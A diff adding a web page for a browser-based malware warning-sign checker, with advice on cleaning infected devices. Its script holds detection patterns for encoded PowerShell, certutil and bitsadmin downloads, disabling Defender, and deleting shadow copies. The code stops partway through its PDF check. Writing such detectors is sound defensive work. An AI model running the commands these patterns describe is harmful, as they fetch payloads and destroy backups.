@@ -1,0 +1,585 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="manifest" href="/manifest.webmanifest"><meta name="theme-color" content="#081826"><script src="/sw-register.js" defer></script><script src="/web-analytics.js" defer></script><script src="usage-counter.js" defer></script>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Virus Check Forge — check files and links for warning signs before you open them | MigaBuilder</title>
+<meta name="description" content="Free file and link safety check: finds disguised programs, Office macros, PDF JavaScript, dangerous scripts in zip files, fake shortcuts and look-alike phishing links. Files are checked in your browser and never uploaded. Plus clear steps to scan and clean a computer or phone that may be infected.">
+<link rel="canonical" href="https://migabuilder.com/virus-check-forge.html">
+<meta property="og:title" content="Virus Check Forge — is this file or link safe to open? | MigaBuilder">
+<meta property="og:description" content="Check email attachments, downloads and links for the tricks malware uses. Files never leave your browser.">
+<meta property="og:url" content="https://migabuilder.com/virus-check-forge.html"><meta property="og:type" content="website">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=IBM+Plex+Sans:wght@400;600&family=IBM+Plex+Mono:wght@500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="local-tools.css"><link rel="stylesheet" href="tutorials.css">
+<style>
+.hidden{display:none!important}
+.drop{border:2px dashed rgba(22,32,43,.3);border-radius:8px;padding:26px 18px;text-align:center;background:#fff}
+.drop.over{border-color:var(--amber);background:#fff8ea}
+.drop b{font:700 17px 'Space Grotesk';display:block;margin-bottom:4px}
+.note{padding:10px 12px;background:rgba(226,166,59,.14);border-left:3px solid var(--amber);font-size:13px;line-height:1.5;margin-top:12px}
+.note.red{background:rgba(216,96,74,.12);border-color:var(--error)}
+.fcard{background:#fff;border:1px solid rgba(22,32,43,.14);border-left:6px solid var(--vc,#9aa);border-radius:6px;padding:14px 16px;margin-top:12px}
+.fcard.bad{--vc:#D8604A}.fcard.warn{--vc:#E2A63B}.fcard.good{--vc:#4E9E73}.fcard.busy{--vc:#9aa}
+.fhead{display:flex;gap:10px;align-items:flex-start;justify-content:space-between;flex-wrap:wrap}
+.fname{font:700 15px 'Space Grotesk';word-break:break-all}
+.fmeta{font-size:12px;color:rgba(22,32,43,.6);margin-top:2px}
+.pill{font:700 12.5px 'Space Grotesk';padding:5px 11px;border-radius:999px;white-space:nowrap;color:#fff;background:var(--vc,#9aa)}
+.fcard.warn .pill{color:#4A3410}
+.verdict{font-size:13.5px;margin:8px 0 2px;line-height:1.5}
+.finds{list-style:none;padding:0;margin:8px 0 0}
+.finds li{display:flex;gap:9px;padding:6px 0;border-top:1px solid rgba(22,32,43,.07);font-size:13.5px;line-height:1.45}
+.finds li:first-child{border-top:0}
+.finds .ic{flex:none;width:20px;text-align:center}
+.finds li>span:last-child{min-width:0}.finds code{word-break:break-all}
+.finds small{display:block;color:rgba(22,32,43,.62);font-size:12.5px}
+.hashrow{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:10px;font-size:12.5px}
+.hashrow code{font:500 11.5px 'IBM Plex Mono',monospace;background:#f3f1ea;padding:4px 7px;border-radius:3px;word-break:break-all}
+.hashrow a,.hashrow button{font-size:12.5px;font-weight:600}
+.hashrow button{border:1px solid rgba(22,32,43,.2);background:#fff;border-radius:3px;padding:3px 8px;cursor:pointer;color:var(--ink)}
+.summary{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.summary span{background:#fff;border:1px solid rgba(22,32,43,.15);border-left:5px solid var(--vc);border-radius:4px;padding:4px 10px;font-size:13px}
+.help{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:12px}
+.help details{background:#fff;border:1px solid rgba(22,32,43,.14);border-radius:6px;padding:10px 14px}
+.help summary{cursor:pointer;font:700 15px 'Space Grotesk'}
+.help ol,.help ul{padding-left:20px;margin:8px 0 0;font-size:13.5px;line-height:1.55}
+.help li{margin-bottom:4px}
+.tips{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px;font-size:13.5px;line-height:1.5}
+@media(max-width:620px){.drop{padding:20px 12px}.fcard{padding:12px}}
+</style>
+</head>
+<body>
+<nav class="tool-nav"><a href="index.html">← All tools</a><span>Virus Check Forge</span></nav>
+<header class="masthead"><div><h1>Virus Check Forge</h1><p>Check email attachments, downloads and links for the tricks malware uses — before you open them. Files are checked inside your browser and never uploaded.</p></div></header>
+<main>
+<section class="panel" id="filePanel">
+  <h2>Check files</h2>
+  <p>Drop in an attachment, a download or a zip file. Virus Check Forge looks at what the file really is, not just its name, and lists anything that is a warning sign.</p>
+  <div class="drop" id="dropZone">
+    <b>Drop files here</b>
+    <span class="muted">or</span>
+    <div class="actions" style="justify-content:center;margin-top:8px">
+      <label class="primary" style="display:inline-block"><input type="file" id="fileInput" multiple hidden>📂 Choose files</label>
+      <button class="secondary" id="exampleBtn">🧪 Try example files</button>
+      <button class="secondary hidden" id="clearBtn">Clear</button>
+    </div>
+    <p class="muted" style="margin:10px 0 0">🔒 Your files are not uploaded. Only you decide whether to look up a file’s fingerprint on VirusTotal.</p>
+  </div>
+  <div class="summary" id="summary"></div>
+  <div id="results" aria-live="polite"></div>
+  <div class="actions hidden" id="reportRow" style="margin-top:12px"><button class="secondary" id="reportBtn">⬇ Download the report</button></div>
+  <div class="note"><b>What this can and can’t do.</b> It catches the tricks most email and download malware relies on: programs pretending to be documents, macros, scripts, booby-trapped PDFs and shortcuts. It does not have a full virus database, so brand-new malware inside an ordinary-looking program can pass. <b>“No warning signs” does not prove a file is safe.</b> For a second opinion, look the fingerprint up on VirusTotal, and keep your computer’s own antivirus switched on.</div>
+</section>
+
+<section class="panel" id="linkPanel">
+  <h2>Check links</h2>
+  <p>Paste a link from an email, a text message or a chat — or the whole message. The link is checked here and is never opened.</p>
+  <div class="field"><label for="urlInput">Links or message text</label><textarea id="urlInput" spellcheck="false" style="min-height:100px;font-family:'IBM Plex Mono',monospace;font-size:13px" placeholder="https://example.com/login&#10;…or paste the whole message"></textarea></div>
+  <div class="actions"><button class="primary" id="urlBtn">🔍 Check links</button><button class="secondary" id="urlExampleBtn">🧪 Try example links</button></div>
+  <div id="urlResults" aria-live="polite"></div>
+</section>
+
+<section class="panel" id="helpPanel">
+  <h2>Think your computer or phone has a virus?</h2>
+  <div class="note red" style="margin:0 0 14px"><b>No website can scan or clean your computer.</b> Browsers don’t let web pages see your files or programs. If a page suddenly says your device is infected, shows a phone number, or wants you to download a “cleaner”, it is a scam: close the tab (or the whole browser), and never call the number.</div>
+  <p>Real removal needs software installed on the device. Most devices already have it. Open a section for the steps:</p>
+  <div class="help">
+    <details id="help-windows" open><summary>🪟 Windows</summary><ol>
+      <li>Open <b>Windows Security</b> → <b>Virus &amp; threat protection</b> → <b>Scan options</b>, choose <b>Full scan</b> and press <b>Scan now</b>.</li>
+      <li>Then run <b>Microsoft Defender Offline scan</b> from the same list. The PC restarts and removes malware that hides while Windows runs.</li>
+      <li>For a second opinion, use the free <b>Malwarebytes</b> or <b>Microsoft Safety Scanner</b>, downloaded only from their official sites.</li>
+      <li>In <b>Settings → Apps</b>, uninstall programs you don’t recognise, and remove unknown browser extensions.</li>
+    </ol></details>
+    <details id="help-mac"><summary>🍎 Mac</summary><ol>
+      <li>Install the latest macOS update — its built-in protection (XProtect) removes known malware automatically.</li>
+      <li>Check <b>System Settings → General → Login Items</b> and remove anything you don’t recognise.</li>
+      <li>Move unknown apps from <b>Applications</b> to the Trash, and remove unknown Safari or Chrome extensions.</li>
+      <li>For a scan, use the free <b>Malwarebytes for Mac</b>.</li>
+    </ol></details>
+    <details id="help-android"><summary>🤖 Android</summary><ol>
+      <li>Open the <b>Play Store</b> → your profile picture → <b>Play Protect</b> → <b>Scan</b>.</li>
+      <li>If a bad app won’t uninstall, restart in <b>safe mode</b> (hold the power button, then hold <b>Power off</b>) and remove it there.</li>
+      <li>Check <b>Settings → Security → Device admin apps</b> and switch off anything unknown.</li>
+      <li>Only install apps from Google Play.</li>
+    </ol></details>
+    <details id="help-iphone"><summary>📱 iPhone and iPad</summary><ol>
+      <li>Real viruses are very rare. Install the latest iOS update.</li>
+      <li>Remove unknown profiles in <b>Settings → General → VPN &amp; Device Management</b>.</li>
+      <li>Calendar spam or pop-ups? Delete unknown calendar subscriptions and clear <b>Settings → Apps → Safari → Clear History and Website Data</b>.</li>
+    </ol></details>
+    <details id="help-signs"><summary>🚩 Signs of an infection</summary><ul>
+      <li>Pop-ups or ads everywhere, even outside the browser.</li>
+      <li>A new home page, search engine or toolbar you didn’t choose.</li>
+      <li>Your antivirus was switched off without you doing it.</li>
+      <li>Friends get messages you didn’t send.</li>
+      <li>Your files have strange new names and a ransom note (ransomware).</li>
+    </ul></details>
+    <details id="help-after"><summary>🔑 After cleaning</summary><ul>
+      <li>Change your passwords <b>from a different, clean device</b> — email first, then banking.</li>
+      <li>Turn on two-step sign-in everywhere you can.</li>
+      <li>Check your bank account for payments you didn’t make.</li>
+      <li>Ransomware? Disconnect from the internet, don’t pay, and look for a free decryptor at <a href="https://www.nomoreransom.org/" target="_blank" rel="noopener">nomoreransom.org</a>.</li>
+    </ul></details>
+  </div>
+</section>
+
+<section class="panel">
+  <h2>What it checks</h2>
+  <div class="tips">
+    <div><b>🎭 Disguises</b><br>Programs and scripts renamed to look like a PDF, photo or document; double extensions like <code>invoice.pdf.exe</code>; hidden right-to-left letters that flip the end of a name; shortcuts (.lnk) that run commands.</div>
+    <div><b>📄 Documents</b><br>Word, Excel and PowerPoint macros and the commands they run, templates loaded from the internet, embedded objects, old equation-editor exploits in RTF and .doc, and JavaScript, auto-run actions, launch commands and attached files in PDFs.</div>
+    <div><b>🗜️ Zip files</b><br>Opens zip files (and files inside them) to find scripts, shortcuts and programs, password-protected contents, and zip bombs.</div>
+    <div><b>📜 Scripts and web pages</b><br>Hidden PowerShell, download-and-run commands, attempts to switch off antivirus, ransomware commands, and HTML attachments that fake a login page or smuggle a download.</div>
+    <div><b>🔗 Links</b><br>Look-alike brand names (paypa1, apple.com.verify-id.top), hidden real addresses after an @, international look-alike letters, raw IP addresses, link shorteners and risky domain endings.</div>
+    <div><b>🔒 Private</b><br>Everything runs in this page with JavaScript. Files are never uploaded, and links are never opened. The VirusTotal buttons send only the fingerprint or the link, and only when you press them.</div>
+  </div>
+</section>
+</main>
+<footer>Virus Check Forge · part of MigaBuilder · your files never leave this device</footer>
+<script>
+(function(){
+'use strict';
+const $=id=>document.getElementById(id);
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const fmtSize=n=>n<1024?n+' bytes':n<1048576?(n/1024).toFixed(1)+' KB':n<1073741824?(n/1048576).toFixed(1)+' MB':(n/1073741824).toFixed(2)+' GB';
+const extOf=n=>{const m=/\.([A-Za-z0-9]{1,10})$/.exec(n.trim());return m?m[1].toLowerCase():''};
+const set=s=>new Set(s.split(' '));
+const EXEC=set('exe scr com pif cpl msi msp msix msixbundle appx appxbundle dll sys ocx drv jar apk xapk app dmg pkg deb rpm run bin elf xll gadget sct');
+const SCRIPT=set('bat cmd vbs vbe js jse wsf wsh wsc hta ps1 psm1 psd1 sh bash py pyw pl rb reg inf scf url lnk application msc vb mjs cjs ws jsx command');
+const DISK=set('iso img vhd vhdx udf');
+const MACRO=set('docm dotm xlsm xltm xlsb xlam pptm potm ppam ppsm sldm');
+const DOC=set('pdf doc docx dot dotx xls xlsx xlt xltx ppt pptx pps ppsx rtf odt ods odp txt csv md');
+const MEDIA=set('jpg jpeg png gif webp bmp tif tiff heic heif svg ico mp3 mp4 mov avi wav m4a ogg webm mkv flac aac');
+const IMAGE=set('jpg jpeg png gif webp bmp tif tiff heic heif ico');
+const KIND={ // what a file really is, from its first bytes
+  pe:'a Windows program',elf:'a Linux program',macho:'a Mac program',class:'a Java program',lnk:'a Windows shortcut',pdf:'a PDF document',zip:'a zip archive',ooxml:'an Office document',ole:'an old-style Office file or installer',
+  rar:'a RAR archive','7z':'a 7-Zip archive',gz:'a gzip archive',cab:'a Windows cabinet archive',chm:'a Windows help file',rtf:'an RTF document',iso:'a disk image',png:'a PNG image',jpeg:'a JPEG image',gif:'a GIF image',webp:'a WebP image',
+  bmp:'a BMP image',ico:'an icon',tiff:'a TIFF image',heic:'a HEIC photo',mp3:'an MP3 audio file',mp4:'a video or audio file',wav:'a WAV audio file',ogg:'an Ogg audio file',webm:'a WebM video',wasm:'a WebAssembly program',
+  html:'a web page',empty:'an empty file',svg:'an SVG image',script:'a script',text:'a plain text file',unknown:'an unrecognised type'
+};
+const PROGRAM_KINDS=set('pe elf macho class lnk script chm wasm');
+
+// ---------- byte helpers ----------
+const u16=(b,o)=>b[o]|b[o+1]<<8, u32=(b,o)=>(b[o]|b[o+1]<<8|b[o+2]<<16|b[o+3]<<24)>>>0;
+const startsWith=(b,arr,o=0)=>arr.every((v,i)=>b[o+i]===v);
+const latin1=(b,max)=>new TextDecoder('latin1').decode(max&&b.length>max?b.subarray(0,max):b);
+const utf8=b=>new TextDecoder('utf-8').decode(b);
+function entropy(b){const n=Math.min(b.length,8*1048576);if(!n)return 0;const c=new Uint32Array(256);for(let i=0;i<n;i++)c[b[i]]++;let e=0;for(const v of c)if(v){const p=v/n;e-=p*Math.log2(p)}return e}
+function looksText(b){const n=Math.min(b.length,4096);if(!n)return true;let bad=0;for(let i=0;i<n;i++){const x=b[i];if(x===0)return false;if(x<9||(x>13&&x<32&&x!==27))bad++}return bad/n<0.02}
+async function inflate(bytes,format,cap){
+  if(typeof DecompressionStream==='undefined')throw new Error('no DecompressionStream');
+  const reader=new Blob([bytes]).stream().pipeThrough(new DecompressionStream(format)).getReader();
+  const parts=[];let total=0;
+  try{for(;;){const {done,value}=await reader.read();if(done)break;parts.push(value);total+=value.length;if(total>cap){reader.cancel().catch(()=>{});break}}}
+  catch(e){if(!total)throw e} // keep what was read before a damaged end
+  const out=new Uint8Array(Math.min(total,cap));let p=0;for(const v of parts){const take=Math.min(v.length,out.length-p);out.set(v.subarray(0,take),p);p+=take;if(p>=out.length)break}
+  return out;
+}
+
+function sniff(b){
+  if(startsWith(b,[0x4D,0x5A]))return 'pe';
+  if(startsWith(b,[0x7F,0x45,0x4C,0x46]))return 'elf';
+  if([[0xFE,0xED,0xFA,0xCE],[0xFE,0xED,0xFA,0xCF],[0xCE,0xFA,0xED,0xFE],[0xCF,0xFA,0xED,0xFE]].some(m=>startsWith(b,m)))return 'macho';
+  if(startsWith(b,[0xCA,0xFE,0xBA,0xBE]))return u32(b,4)>0x2C000000?'class':'macho'; // Java class files and Mac universal programs share this start
+  if(startsWith(b,[0x4C,0,0,0,0x01,0x14,0x02,0]))return 'lnk';
+  if(startsWith(b,[0x50,0x4B,0x03,0x04])||startsWith(b,[0x50,0x4B,0x05,0x06]))return 'zip';
+  if(startsWith(b,[0xD0,0xCF,0x11,0xE0,0xA1,0xB1,0x1A,0xE1]))return 'ole';
+  if(startsWith(b,[0x52,0x61,0x72,0x21]))return 'rar';
+  if(startsWith(b,[0x37,0x7A,0xBC,0xAF,0x27,0x1C]))return '7z';
+  if(startsWith(b,[0x1F,0x8B]))return 'gz';
+  if(startsWith(b,[0x4D,0x53,0x43,0x46]))return 'cab';
+  if(startsWith(b,[0x49,0x54,0x53,0x46]))return 'chm';
+  if(startsWith(b,[0x00,0x61,0x73,0x6D]))return 'wasm';
+  if(startsWith(b,[0x89,0x50,0x4E,0x47]))return 'png';
+  if(startsWith(b,[0xFF,0xD8,0xFF]))return 'jpeg';
+  if(startsWith(b,[0x47,0x49,0x46,0x38]))return 'gif';
+  if(startsWith(b,[0x52,0x49,0x46,0x46])){const t=latin1(b.subarray(8,12));return t==='WEBP'?'webp':t==='WAVE'?'wav':'unknown'}
+  if(startsWith(b,[0x42,0x4D])&&b.length>26&&u32(b,2)===b.length)return 'bmp';
+  if(startsWith(b,[0,0,1,0])&&b.length>6&&b[4]>0)return 'ico';
+  if(startsWith(b,[0x49,0x49,0x2A,0])||startsWith(b,[0x4D,0x4D,0,0x2A]))return 'tiff';
+  if(startsWith(b,[0x4F,0x67,0x67,0x53]))return 'ogg';
+  if(startsWith(b,[0x1A,0x45,0xDF,0xA3]))return 'webm';
+  if(startsWith(b,[0x49,0x44,0x33])||(b[0]===0xFF&&(b[1]&0xE0)===0xE0))return 'mp3';
+  if(latin1(b.subarray(4,8))==='ftyp'){const brand=latin1(b.subarray(8,12));return /hei|mif1|heix/.test(brand)?'heic':'mp4'}
+  for(const o of [0x8001,0x8801,0x9001])if(b.length>o+5&&latin1(b.subarray(o,o+5))==='CD001')return 'iso';
+  const head=latin1(b.subarray(0,1024));
+  if(head.includes('%PDF-'))return 'pdf';
+  if(head.startsWith('{\\rt'))return 'rtf';
+  if(!looksText(b))return 'unknown';
+  const t=head.replace(/^﻿|^\xEF\xBB\xBF/,'').trimStart().toLowerCase();
+  if(t.startsWith('#!'))return 'script';
+  if(/^<\?xml[^>]*>\s*(<!--[\s\S]*?-->\s*)*(<!doctype svg[^>]*>\s*)?<svg|^<svg/.test(t))return 'svg';
+  if(/^(<!doctype html|<html|<head|<body|<script|<meta|<iframe|<form|<!--)/.test(t)||/<html[\s>]|<script[\s>]/.test(t))return 'html';
+  return 'text';
+}
+
+// ---------- findings ----------
+// level: bad (dangerous), warn (be careful), info (good to know), ok (reassuring)
+function nameCheck(nm,F,where){
+  const pre=where?'Inside the zip, “'+where+'”: ':'';
+  const ext=extOf(nm),parts=nm.toLowerCase().split('.'),prev=parts.length>2?parts[parts.length-2].trim():'';
+  if(/[‪-‮⁦-⁩‎‏]/.test(nm))F.push(['bad',pre+'The name contains a hidden “right-to-left” character.','It flips the end of the name on screen, so a program can look like it ends in .pdf or .jpg. Real documents never need it.']);
+  if((EXEC.has(ext)||SCRIPT.has(ext))&&(DOC.has(prev)||MEDIA.has(prev)))F.push(['bad',pre+'Double extension: it looks like a .'+prev+' but really ends in .'+ext+'.','Windows hides the last part by default, so “'+esc(nm.replace(/\.[^.]+$/,''))+'” is what you see. This is a classic malware trick.']);
+  else if(/\s{3,}\.[a-z0-9]+$|\.{2,}[a-z0-9]+$/i.test(nm))F.push(['warn',pre+'The name has a long gap before the extension.','Long gaps push the real ending out of sight in a narrow window.']);
+  if(EXEC.has(ext))F.push(['warn',pre+'This is a program (.'+ext+').','A program can do anything on your computer. Only run it if you were expecting it and it comes from a source you trust, such as the maker’s own website.']);
+  else if(ext==='lnk')F.push(['bad',pre+'This is a Windows shortcut (.lnk).','Shortcuts sent by email or in zip files are used to run hidden commands. A real document is never a shortcut.']);
+  else if(SCRIPT.has(ext))F.push([where?'bad':'warn',pre+'This is a script (.'+ext+') that runs when you double-click it.',where?'Scripts inside zip files are one of the most common ways malware is spread by email.':'Only run scripts you wrote or fully trust. Attachments almost never need to be scripts.']);
+  else if(DISK.has(ext))F.push(['warn',pre+'This is a disk image (.'+ext+').','Disk images are used to slip programs past Windows download warnings. Be careful with what is inside.']);
+  else if(MACRO.has(ext))F.push(['warn',pre+'This Office file type (.'+ext+') can contain macros.','Macros are small programs. Never press “Enable content” or “Enable macros” on a file you were sent.']);
+}
+const KW=[ // patterns in scripts, macros, web pages and shortcuts
+  [/powershell(?:\.exe)?["']?\s[^\n]{0,80}?-(?:e|en|enc|enco|encodedcommand)\s+[A-Za-z0-9+\/=]{20,}/i,'bad','Runs a hidden, encoded PowerShell command.'],
+  [/-w(?:indowstyle)?\s+h(?:idden)?\b/i,'warn','Opens a hidden window so you don’t see what runs.'],
+  [/\b(?:IEX|Invoke-Expression)\b/i,'warn','Runs code it builds or downloads at run time (Invoke-Expression).'],
+  [/DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|\biwr\b|Start-BitsTransfer|Net\.WebClient|URLDownloadToFile|MSXML2\.XMLHTTP|WinHttp\.WinHttpRequest|ServerXMLHTTP/i,'warn','Downloads something from the internet.'],
+  [/FromBase64String|\batob\s*\(|base64\s+-d/i,'warn','Decodes hidden (base64) content.'],
+  [/WScript\.Shell|Shell\.Application|\bShellExecute\b|\bWScript\.Run\b|CreateObject\s*\(\s*["']WScript/i,'warn','Can start other programs (Windows Script Host).'],
+  [/new\s+ActiveXObject|CreateObject\s*\(/i,'warn','Creates Windows system objects (ActiveX/COM).'],
+  [/\b(?:mshta|rundll32|regsvr32|wmic|cscript|wscript|msiexec)(?:\.exe)?\b(?!\.)/i,'warn','Starts a built-in Windows tool that malware often misuses.'],
+  [/certutil(?:\.exe)?\s[^\n]{0,40}-(?:decode|urlcache)|bitsadmin(?:\.exe)?\s[^\n]{0,40}\/transfer/i,'bad','Uses certutil or bitsadmin to download or unpack files — a common malware trick.'],
+  [/schtasks(?:\.exe)?\s[^\n]{0,20}\/create|CurrentVersion\\\\?Run\b|Startup\\\\?/i,'warn','Makes itself start every time the computer starts.'],
+  [/Set-MpPreference\s[^\n]{0,60}-Disable|Add-MpPreference\s[^\n]{0,30}-Exclusion|DisableAntiSpyware|DisableRealtimeMonitoring/i,'bad','Tries to switch off or blind Microsoft Defender.'],
+  [/vssadmin(?:\.exe)?\s[^\n]{0,20}delete\s+shadows|wbadmin\s+delete|bcdedit[^\n]{0,40}recoveryenabled\s+no|cipher(?:\.exe)?\s+\/w/i,'bad','Deletes backups and restore points — typical of ransomware.'],
+  [/\b(?:AutoOpen|Auto_Open|Document_Open|Workbook_Open|AutoExec|AutoClose|Document_Close|Workbook_Activate)\b/,'warn','Macro starts by itself when the document opens.'],
+  [/\bString\.fromCharCode\s*\((?:\s*\d+\s*,){20,}|\beval\s*\(\s*(?:unescape|atob|function\s*\(p,a,c,k,e)/i,'warn','Uses scrambled (obfuscated) code to hide what it does.']
+];
+function keywords(text,F,pre,{escalate=true}={}){
+  const hits=[];for(const [re,lvl,msg] of KW){const m=re.exec(text);if(m)hits.push([lvl,msg,m[0]])}
+  const com=hits.findIndex(h=>h[1]===KW[6][2]);if(com>=0&&hits.some(h=>h[1]===KW[5][2]))hits.splice(com,1); // WScript.Shell is already a COM object
+  // Several warning signs together are much worse than one alone.
+  const bump=escalate&&hits.filter(h=>h[0]==='warn').length>=3;
+  hits.forEach(([lvl,msg,snip])=>F.push([bump?'bad':lvl,(pre||'')+msg,'Found: <code>'+esc(snip.length>90?snip.slice(0,90)+'…':snip)+'</code>']));
+  const b64=/[A-Za-z0-9+\/]{3000,}={0,2}/.exec(text);
+  if(b64)F.push(['warn',(pre||'')+'Contains a large block of encoded data ('+fmtSize(b64[0].length)+').','Large hidden blobs are often used to carry a program inside a script or web page.']);
+  return hits.length;
+}
+const EICAR_TAG='EICAR-STANDARD-'+'ANTIVIRUS-TEST-FILE';
+const EICAR_SHA='275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';
+
+async function analyze(bytes,nm,depth){
+  if(!bytes.length)return {F:[['info','The file is empty.','There is nothing in it that could run.']],kind:'empty'};
+  const F=[],ext=extOf(nm),kind=sniff(bytes);let real=kind;
+  if(kind==='zip')real=await zipKind(bytes);
+  if(!depth)nameCheck(nm,F); // names inside a zip are checked by zipCheck
+  // Does the content match the name?
+  const isProg=PROGRAM_KINDS.has(real)||(real==='html'&&ext==='hta');
+  if(isProg&&(DOC.has(ext)||MEDIA.has(ext)||ext===''))F.push(['bad','The name says “.'+(ext||'(none)')+'”, but the file is really '+KIND[real]+'.','A program dressed up as a document or picture is almost always malware. Don’t open it.']);
+  else if(IMAGE.has(ext)&&!['png','jpeg','gif','webp','bmp','ico','tiff','heic'].includes(real))F.push([real==='unknown'?'warn':'bad','The name says it is a picture, but it is really '+KIND[real]+'.','Pictures from unknown senders that are not pictures are a common trick.']);
+  else if(ext==='pdf'&&real!=='pdf')F.push(['warn','The name says PDF, but it is really '+KIND[real]+'.','Check with the sender before you open it.']);
+  else if(['docx','xlsx','pptx','docm','xlsm','pptm'].includes(ext)&&real!=='ooxml')F.push(['warn','The name says Office document, but it is really '+KIND[real]+'.','Renamed files are used to get past email filters.']);
+  // EICAR antivirus test file
+  const head=latin1(bytes,1024*1024);
+  if(head.includes(EICAR_TAG))F.push(['bad','This is the EICAR antivirus test file.','It is harmless — it exists so people can check that antivirus works. Real antivirus will flag it as a virus on purpose.']);
+  // Content checks by real type
+  if(real==='pe')peCheck(bytes,F);
+  else if(real==='elf'||real==='macho'||real==='class')F.push(['warn','This is '+KIND[real]+'.','Only run programs you were expecting, from sources you trust.']);
+  else if(real==='lnk')lnkCheck(bytes,F);
+  else if(real==='pdf')await pdfCheck(bytes,F);
+  else if(real==='ooxml')await officeCheck(bytes,F);
+  else if(real==='zip')await zipCheck(bytes,F,depth);
+  else if(real==='ole')oleCheck(bytes,F,ext);
+  else if(real==='rtf')rtfCheck(bytes,F);
+  else if(real==='chm')F.push(['warn','Windows help files (.chm) can run scripts and programs.','Old help files are rarely sent by email any more. Be careful.']);
+  else if(['rar','7z','gz','cab','iso'].includes(real))F.push(['info','This is '+KIND[real]+'. Its contents can’t be opened here.','Unpack it, then drop the files inside into this page to check them.']);
+  else if(real==='html'||real==='svg')htmlCheck(utf8(bytes.subarray(0,20*1048576)),F,real);
+  else if(real==='script'||real==='text'){const t=utf8(bytes.subarray(0,20*1048576));if(SCRIPT.has(ext)||real==='script')keywords(t,F);else if(keywords(t,F,'',{escalate:false})&&ext==='txt')F.push(['info','This text file contains script commands.','A .txt file can’t run by itself, but don’t copy these commands into a terminal.'])}
+  // A program hidden inside a file that isn't a program
+  if(!['pe','zip','ooxml','ole','rar','7z','gz','cab','iso'].includes(real)&&bytes.length>2048){
+    const all=latin1(bytes,64*1048576),i=all.indexOf('This program cannot be run in DOS mode',512);
+    if(i>0)F.push([MEDIA.has(ext)||DOC.has(ext)?'bad':'warn','A Windows program is hidden inside this file.','Found at byte '+i.toLocaleString()+'. Pictures and documents have no reason to carry a program.']);
+  }
+  return {F,kind:real};
+}
+
+function peCheck(b,F){
+  const off=b.length>0x40?u32(b,0x3C):0;
+  if(!off||off+24>b.length||latin1(b.subarray(off,off+4))!=='PE\0\0'){F.push(['warn','This is an old-style or damaged Windows program.','Don’t run it unless you know exactly where it came from.']);return}
+  const chars=u16(b,off+22),optOff=off+24,magic=u16(b,optOff),isDll=!!(chars&0x2000);
+  F.push(['warn','This is '+(isDll?'a Windows program library (DLL)':'a Windows program')+'.','A program can do anything on your computer. Run it only if you expected it and trust where it came from.']);
+  const dd=optOff+(magic===0x20b?112:96),secOff=dd+4*8;
+  if(secOff+8<=b.length&&(magic===0x10b||magic===0x20b)){
+    const size=u32(b,secOff+4);
+    if(size>0)F.push(['info','It has a digital signature block.','This page can’t verify it. On Windows, right-click the file → Properties → Digital Signatures to see who signed it, and that the signature is OK.']);
+    else F.push(['warn','It is not digitally signed.','Most real software from companies is signed. Unsigned programs from an email or an unknown website are risky.']);
+  }
+  const nSec=u16(b,off+6),sz=u16(b,off+20);let names=[];
+  for(let i=0,p=optOff+sz;i<Math.min(nSec,40)&&p+40<=b.length;i++,p+=40)names.push(latin1(b.subarray(p,p+8)).replace(/\0+$/,''));
+  if(names.some(n=>/^UPX/i.test(n))||entropy(b)>7.4)F.push(['info','It is packed (compressed).','Installers are often packed, but so is malware, to hide from antivirus.']);
+}
+function lnkCheck(b,F){
+  const s=latin1(b)+' '+new TextDecoder('utf-16le').decode(b.subarray(0,b.length&~1));
+  F.push(['bad','This is a Windows shortcut.','Shortcuts sent as attachments or inside zip files are used to run hidden commands.']);
+  const m=/(?:powershell|cmd(?:\.exe)?|mshta|wscript|cscript|rundll32|regsvr32|bitsadmin|certutil|curl|conhost)[^\0\r\n]{0,120}/i.exec(s);
+  if(m)F.push(['bad','The shortcut runs a command.','Found: <code>'+esc(m[0])+'</code>']);
+  const u=/https?:\/\/[^\s\0"']{4,120}/i.exec(s);if(u)F.push(['warn','The shortcut contains a web address.','<code>'+esc(u[0])+'</code>']);
+}
+async function pdfCheck(b,F){
+  let t=latin1(b,64*1048576);
+  // Also look inside compressed streams, where these words are often hidden.
+  const streams=[];let re=/stream\r?\n/g,m,n=0;
+  while((m=re.exec(t))&&n<300){const s=m.index+m[0].length,e=t.indexOf('endstream',s);if(e<0)break;if(e-s<5*1048576&&/FlateDecode/.test(t.slice(Math.max(0,m.index-400),m.index))){n++;streams.push(inflate(b.subarray(s,e),'deflate',8*1048576).then(x=>latin1(x)).catch(()=>''))}re.lastIndex=e}
+  t+=(await Promise.all(streams)).join('\n');
+  t=t.replace(/#([0-9A-Fa-f]{2})/g,(_,h)=>String.fromCharCode(parseInt(h,16))); // /J#61vaScript → /JavaScript
+  const has=k=>new RegExp('/'+k+'(?![A-Za-z])').test(t),count=k=>(t.match(new RegExp('/'+k+'(?![A-Za-z])','g'))||[]).length;
+  const js=has('JavaScript')||has('JS'),auto=has('OpenAction')||has('AA');
+  if(has('Launch'))F.push(['bad','The PDF can launch a program or command (/Launch).','Real PDFs almost never need this. Don’t open it.']);
+  if(js&&auto)F.push(['warn','The PDF runs JavaScript automatically when it opens.','Some forms use this, but it is also how booby-trapped PDFs attack PDF readers. Open it in your browser’s built-in viewer, not in Adobe Reader, or not at all.']);
+  else if(js)F.push(['warn','The PDF contains JavaScript.','Often used in forms. Keep your PDF reader updated.']);
+  else if(auto)F.push(['info','The PDF does something when it opens (/OpenAction).','Often just “go to page 1”, but worth knowing.']);
+  if(has('EmbeddedFile')){
+    const names=[...t.matchAll(/\/(?:UF|F)\s*\(([^)]{1,200})\)/g)].map(x=>x[1]).filter(x=>/\.[a-z0-9]{2,5}$/i.test(x));
